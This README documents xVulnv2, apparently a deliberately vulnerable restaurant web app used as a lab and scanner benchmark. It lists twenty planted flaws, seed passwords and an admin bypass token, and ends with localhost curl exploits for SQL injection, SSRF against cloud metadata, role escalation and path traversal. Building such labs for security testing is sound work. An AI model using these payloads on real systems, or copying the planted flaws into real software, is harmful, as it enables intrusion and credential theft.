# xVulnv2 — The Local Plate

> **A realistic fictional restaurant web application purpose-built as a vulnerability lab.**  
> Indistinguishable from a production system. Every vulnerability is a natural developer mistake inside real business logic.

---

## 📸 Preview

| Homepage | Menu | Item Detail |
|----------|------|-------------|
| Dark luxury hero, gold typography | Category filters, search, card grid | Detail view, quantity picker, guest reviews |

---

## 🏗️ Architecture

```
Frontend  →  http://localhost:4444   (static HTML/CSS/JS SPA)
Backend   →  http://localhost:4443   (Go REST API + SQLite)
```

Both are served by a **single Go binary**. The frontend makes cross-origin API calls to the backend using `credentials: include` for session handling.

Advanced lab scenarios are wired into the same app through feature-gated business flows:
- Menu admin uploads store arbitrary assets under `static/uploads/menus/`
- Order placement uses seeded kitchen inventory for stock reservation
- Kitchen staff workflows use recipe viewing, inventory adjustment, and JWT-based panel access
- Invoice exports are written to predictable public temp locations under `static/exports/tmp/`
- Reverse-proxy desync is simulated through the kitchen dispatch endpoint

---

## ⚡ Quick Start

### Prerequisites

| Tool | Version |
|------|---------|
| Go | 1.21+ |
| GCC / Xcode Command Line Tools | Required for SQLite (CGO) |

On macOS, install Xcode tools if needed:
```bash
xcode-select --install
```

### Run

```bash
# Download dependencies
go mod tidy

# Build and start (recommended)
make run

# Or manually:
go build -o xvulnv2 .
./xvulnv2
```

**Expected output:**
```
🍽️  The Local Plate — Restaurant App
   Frontend  →  http://localhost:4444
   Backend   →  http://localhost:4443
```

Open **http://localhost:4444** in your browser.

---

## 🔧 Configuration

All settings are controlled via environment variables. Defaults work out of the box.

| Variable | Default | Description |
|----------|---------|-------------|
| `FRONTEND_PORT` | `4444` | Port for the static frontend server |
| `BACKEND_PORT` | `4443` | Port for the REST API backend |
| `DB_PATH` | `./restaurant.db` | SQLite database file path |
| `SESSION_KEY` | `lab-session-key-change-me` | Session signing key for local lab runs |
| `LOG_PATH` | `./logs/requests.log` | Request log file |
| `APP_ENV` | `lab` | Runtime environment; advanced vuln modules auto-disable in `production` |
| `ENABLE_ADVANCED_VULNS` | `true` in lab/staging, `false` in production | Feature flag for V15–V20 |
| `ALLOW_REMOTE_RESET` | `false` | Set `true` to allow `/api/reset` from non-localhost |

Example with custom ports:
```bash
FRONTEND_PORT=3000 BACKEND_PORT=3001 ./xvulnv2
```

The repository only ships with placeholder lab secrets. Keep real environment files, local databases, generated uploads, exports, and reports out of Git.

---

## 👥 Seed Accounts

The database is pre-seeded with deterministic data on every fresh start.

| Username | Email | Password | Role |
|----------|-------|----------|------|
| `admin` | `admin@thelocalplate.com` | `Admin@2024!` | admin |
| `alice` | `alice@example.com` | `Password123` | user |
| `bob` | `bob@example.com` | `Qwerty456` | user |
| `carol` | `carol@example.com` | `Secret789` | user |
| `dave` | `dave@example.com` | `Dave1234` | user |

> ⚠️ Passwords are stored in plaintext by design (vulnerability V08).

---

## 🗺️ Application Features

### Public (no login required)
- **Browse the menu** — full restaurant menu with 10 dishes across 8 categories
- **Filter by category** — Pizza, Pasta, Mains, Salads, Burgers, Starters, Soups, Desserts
- **Search dishes** — real-time debounced search across name and description
- **View item detail** — full description, price, and guest reviews per dish
- **Read reviews** — all guest reviews visible on the Reviews page and per-item

### Authenticated Users
- **Register / Login / Logout** — session-based authentication
- **Place orders** — add items to an order with quantity selection
- **View order history** — see all past orders with status and total
- **Leave reviews** — star rating (1–5) + comment on any dish

### Admin
- **Admin panel** — accessible at `/admin` in the nav (admin role) or via API
- **View all orders** — full order list with customer names and totals
- **View all users** — all user accounts including credentials

---

## 🌐 API Reference

### Auth

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `POST` | `/register` | No | Create account. Accepts `?role=` query param |
| `POST` | `/login` | No | Login with email + password |
| `POST` | `/logout` | No | Destroy session |
| `GET` | `/api/me` | Session | Get current user info |

### Menu

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `GET` | `/api/menu` | No | All menu items. Optional `?category=Pizza` |
| `GET` | `/api/menu/{id}` | No | Single item by ID |
| `DELETE` | `/api/menu/{id}` | Session | Remove item (no admin check) |
| `POST` | `/api/admin/menu/upload-image` | Session | Upload menu assets into the public static directory |
| `GET` | `/api/search?q=` | No | Full-text search on name/description |

### Orders

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `POST` | `/api/orders` | Session | Place a new order |
| `GET` | `/api/orders/{id}` | Session | Get any order by ID (no ownership check) |
| `GET` | `/api/orders/{id}/invoice/export` | Session | Export invoice to a predictable public temp file |
| `GET` | `/api/user/orders` | Session | Get current user's orders |

### Reviews

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `GET` | `/api/reviews` | No | All recent reviews. Optional `?item_id=` |
| `POST` | `/api/reviews` | Session | Submit a review |
| `GET` | `/api/reviews/{id}` | No | Single review by ID |

### Profile

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `GET` | `/api/user/profile?id=` | Session | Get any user's profile (use `?id=`) |
| `POST` | `/api/user/update` | Session | Update profile (accepts `role` field) |

### Admin

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `GET` | `/admin/orders` | Header or Session | All orders with usernames |
| `GET` | `/admin/users` | Header or Session | All users with passwords |

Admin token header: `X-Admin-Token: lab-admin-bypass-token`

### Utilities

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `GET` | `/api/debug/info` | No | App internals, secrets, DB stats |
| `GET` | `/api/files?name=` | No | Read a file from `./uploads/` |
| `GET` | `/api/cart` | Session | Cart placeholder |
| `POST` | `/api/cart/restore` | Session | Restore cart from base64 payload |
| `POST` | `/api/import-menu` | No | Fetch remote URL for menu data |
| `POST` | `/api/reset` | **Localhost only** | Reset database to seed state |

> ⚠️ `/api/reset` is restricted to localhost by default (returns 403 to remote callers). Set `ALLOW_REMOTE_RESET=true` to bypass. Prefer `make reset` instead.

### Kitchen / Staff (Advanced Lab)

These routes are enabled only when advanced lab modules are on.

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `GET` | `/api/kitchen/recipes/view?source=` | No | Read local recipe files or fetch remote recipe templates |
| `POST` | `/api/staff/session` | No | Issue weak JWT for kitchen/staff panel access |
| `GET` | `/api/staff/panel` | Bearer JWT | Kitchen control panel backed by vulnerable JWT validation |
| `GET` | `/api/kitchen/inventory` | Bearer JWT | View current stock levels per menu item |
| `POST` | `/api/kitchen/inventory/adjust` | Bearer JWT | Adjust inventory without business-rule validation |
| `POST` | `/api/kitchen/dispatch` | No | Simulated reverse-proxy dispatch flow for request smuggling |

---

## 🛠️ Makefile Workflow

The Makefile is the primary interface for benchmark operations. All sensitive operations (reset, scan, report) are CLI-only.

```bash
make build                        # Build server + CLI tool
make start                        # Alias for run
make run                          # Build and start the application
make reset                        # Reset DB to seed state (CLI)
make scan SCANNER=my-scanner-v1   # Start a scan session
make scan-stop SCANNER=my-scanner-v1  # Stop a scan session
make report SCANNER=my-scanner-v1 # Generate HTML pentest report
make clean                        # Remove binaries, reports, DB
make help                         # Show all targets
```

### Typical Workflow

```bash
# 1. Build and start the app
make start

# 2. Reset to clean state
make reset

# 3. Start a scan session
make scan SCANNER=zap-run-001

# 4. Run your scanner normally against both app ports with the header
#    X-Scanner-ID: zap-run-001
#    (all tagged traffic is logged with request + response evidence)

# 5. Generate the report
make report SCANNER=zap-run-001
# → Output: ./reports/zap-run-001.html
```

### Scanner ID Rules
- Must match: `[a-zA-Z0-9_-]{1,64}`
- Validated at both Makefile and CLI levels
- `SCANNER` is only the scanner ID value, not a header name
- Valid: `make scan SCANNER=zap-run-001`
- Invalid: `make scan SCANNER=X-Scanner-ID:zap-run-001`
- Invalid: `make scan SCANNER=x-custom:zap-run-001`
- Used as the report filename (e.g., `reports/zap-run-001.html`)

---

## 🧹 Repo Hygiene

- Generated artifacts are gitignored: local databases, logs, reports, public upload/export directories, and local `.env*` files
- Keep only the source fixtures under `uploads/`; do not commit generated payloads from `static/uploads/` or invoice exports from `static/exports/`
- Before pushing, run `make clean` if you want a fully reset workspace, then confirm `git status --short` only shows intentional source changes

---

## 🔄 Benchmark Integration

### Reset State
To restore the application to its original deterministic seed state:
```bash
# Recommended: use the CLI
make reset

# Or via curl (localhost only):
curl -X POST http://localhost:4443/api/reset
```
```json
{"message": "database reset to initial state", "status": "ok"}
```

### Scanner Identification
Start the scan session with the ID value only:
```bash
make scan SCANNER=my-scanner-v1
```

Then tag your scanner's HTTP requests with either header below. All traffic is logged to the `request_logs` table using that value:
```
X-Scanner-ID: my-scanner-v1
X-Scan-Token: benchmark-run-001
```

### Log Access
All requests are stored in SQLite:
```bash
sqlite3 restaurant.db "SELECT method, path, query, status, scanner_id FROM request_logs ORDER BY id DESC LIMIT 20;"
```

### Ground Truth
- **`vulns.json`** — machine-readable vulnerability definitions (ID, category, endpoint, flow, detection hints, trigger, validation logic, CWE, OWASP mapping)
- **`known_findings.md`** — human-readable findings with exact curl examples and expected responses
- Trigger verification is **internal to the benchmark harness** and is not exposed as a public HTTP endpoint.
- `make report` now auto-scores from the logged scanner traffic itself. It does not require the scanner to call a benchmark API or export a custom findings artifact.
- The report is intentionally conservative: it only auto-confirms findings that can be credibly proven from passive HTTP request/response evidence. Findings that require actor identity, forged-token provenance, or multi-request state are shown as **context required** instead of being over-credited or misclassified.

---

## 🛡️ Known Vulnerabilities (Summary)

20 findings are currently tracked by the benchmark. Reference `vulns.json` for full machine-readable definitions and `known_findings.md` for exploit examples.

| ID | Type | Endpoint | Severity |
|----|------|----------|----------|
| V01 | SQL Injection | `GET /api/menu/{id}` | 🔴 Critical |
| V02 | SQL Injection | `GET /api/search?q=` | 🔴 Critical |
| V03 | Stored XSS | `POST /api/reviews` | 🟠 High |
| V04 | SSRF | `POST /api/import-menu` | 🟠 High |
| V05 | IDOR | `GET /api/orders/{id}` | 🟠 High |
| V06 | IDOR | `GET /api/user/profile?id=` | 🟠 High |
| V07 | Broken Auth | `GET /admin/orders`, `/admin/users` | 🔴 Critical |
| V08 | Sensitive Data Exposure | `GET /api/user/profile` | 🟠 High |
| V09 | Security Misconfiguration | `GET /api/debug/info` | 🔴 Critical |
| V10 | Mass Assignment | `POST /register?role=admin` | 🔴 Critical |
| V11 | Broken Function Auth | `DELETE /api/menu/{id}` | 🟠 High |
| V12 | CSRF | `POST /api/orders` | 🟡 Medium |
| V13 | Path Traversal | `GET /api/files?name=` | 🟠 High |
| V14 | Insecure Deserialization | `POST /api/cart/restore` | 🟡 Medium |
| V15 | Unrestricted File Upload | `POST /api/admin/menu/upload-image` | 🟠 High |
| V16 | API9 Improper Inventory Management | `POST /api/kitchen/inventory/adjust` | 🟠 High |
| V17 | LFI / RFI | `GET /api/kitchen/recipes/view?source=` | 🔴 Critical |
| V18 | HTTP Request Smuggling | `POST /api/kitchen/dispatch` | 🟠 High |
| V19 | Insecure Temporary File Usage | `GET /api/orders/{id}/invoice/export` | 🟠 High |
| V20 | JWT Validation Flaws | `POST /api/staff/session`, `GET /api/staff/panel` | 🔴 Critical |

> All vulnerabilities follow behavior-based detection (no payload string matching). See `known_findings.md` for validation logic per finding.

---

## 🔒 Security Model

| Operation | Access Method | HTTP Exposed? |
|-----------|---------------|---------------|
| Reset database | `make reset` / `xvulnctl reset` | Localhost only (403 for remote) |
| Start scan | `make scan SCANNER=X` | ❌ No |
| Stop scan | `make scan-stop SCANNER=X` | ❌ No |
| Generate report | `make report SCANNER=X` | ❌ No |
| View reports | File system only | ❌ No |
| Trigger evaluation | Internal harness only | ❌ No |

**Key security properties:**
- Scanner ID input is validated at two levels (Makefile regex + Go regex) — defence-in-depth
- Report paths are validated against path traversal using `filepath.Abs` prefix check
- `LocalhostOnly` middleware checks `r.RemoteAddr` directly, ignores `X-Forwarded-For`
- Generated reports exclude sensitive data (passwords, session keys)
- `ALLOW_REMOTE_RESET` feature flag for controlled rollback
- `APP_ENV=production` disables the advanced lab scenarios by default
- `ENABLE_ADVANCED_VULNS=false` rolls back V15–V20 without touching existing lab flows
- Remote recipe fetch and request-smuggling simulation endpoints are lightly rate-limited in-memory

---

## 📁 Project Structure

```
xVulnv2/
├── main.go                  # Entry point — dual HTTP servers
├── Makefile                 # CLI orchestration (build/run/reset/scan/report)
├── go.mod / go.sum
├── config/
│   └── config.go            # Port, DB, session, feature flags (env vars)
├── cmd/
│   └── xvulnctl/            # CLI tool for benchmark operations
│       ├── main.go          # Subcommand dispatcher + report generator
│       └── report_template.html  # Embedded HTML report template
├── db/
│   ├── db.go                # SQLite init, migrations, reset
│   ├── seed.go              # Deterministic seed data
│   └── helpers.go           # Raw query helper for vuln handlers
├── middleware/
│   ├── cors.go              # CORS with credentials support
│   ├── localhost.go         # Localhost-only access guard
│   ├── logger.go            # Traffic logger → SQLite
│   └── session.go           # Gorilla session management
├── handlers/
│   ├── auth.go              # /register /login /logout /api/me
│   ├── advanced_lab.go      # upload, recipe, inventory, JWT, temp export, smuggling
│   ├── menu.go              # /api/menu /api/search
│   ├── orders.go            # /api/orders
│   ├── reviews.go           # /api/reviews
│   ├── profile.go           # /api/user/profile /api/user/update
│   ├── admin.go             # /admin/* + /api/debug/info
│   ├── import.go            # /api/import-menu
│   ├── files.go             # /api/files
│   ├── cart.go              # /api/cart /api/cart/restore
│   └── reset.go             # /api/reset (localhost-guarded)
├── models/
│   ├── user.go, menu.go, order.go, review.go
├── static/
│   ├── index.html           # SPA shell with all page templates
│   └── assets/
│       ├── style.css        # Dark luxury theme (Playfair Display + Inter)
│       └── app.js           # SPA router + all API calls
├── recipes/                 # Kitchen recipe fixtures for LFI/RFI flow
├── static/uploads/menus/    # Public menu asset uploads
├── static/exports/tmp/      # Predictable temp invoice exports
├── trigger/                 # Vulnerability detection engine
├── uploads/                 # Sample files for path traversal demo
├── reports/                 # Generated HTML reports (gitignored)
├── vulns.json               # Ground truth — 20 vulnerability definitions
└── known_findings.md        # Exploit examples + validation per finding
```

---

## 🚫 Design Principles

- **No fake vulnerability endpoints** — every vuln lives inside a real feature
- **No payload detection** — the app never checks for `' OR 1=1` patterns
- **No CTF hints** — no `// vulnerable here` comments, no obvious markers
- **Deterministic** — same input always produces the same output; IDs are seeded
- **Resettable** — `make reset` (preferred) or `POST /api/reset` (localhost-only) restores full seed state for pipeline reruns
- **Scanner-friendly** — normal HTTP, discoverable via crawling/fuzzing/input manipulation

---

## 🧪 Developer Notes

- V15–V20 are isolated behind `APP_ENV` / `ENABLE_ADVANCED_VULNS`; existing V01–V14 behavior remains unchanged
- The hardcoded secrets introduced for source-review exercises are placeholder lab values only
- `go.mod` intentionally retains `github.com/dgrijalva/jwt-go` so dependency scanners can flag an archived auth component
- Inventory and export additions are additive only; there are no destructive migrations

---

## 🔁 Quick Exploit Examples

### SQL Injection (V01)
```bash
curl "http://localhost:4443/api/menu/1 UNION SELECT 1,username,email,password,role,image_url,1 FROM users--"
```

### SSRF (V04)
```bash
curl -X POST http://localhost:4443/api/import-menu \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

### Mass Assignment → Admin Privilege Escalation (V10)
```bash
curl -X POST "http://localhost:4443/register?role=admin" \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"h@evil.com","password":"pw"}'
```

### Path Traversal (V13)
```bash
curl "http://localhost:4443/api/files?name=../../go.mod"
```

### Debug Info Dump (V09)
```bash
curl http://localhost:4443/api/debug/info
```

### Weak JWT / Staff Panel (V20)
```bash
curl -X POST http://localhost:4443/api/staff/session \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@thelocalplate.com","password":"Admin@2024!"}'
```

### Recipe Viewer LFI (V17)
```bash
curl "http://localhost:4443/api/kitchen/recipes/view?source=../../go.mod"
```
# xVuln
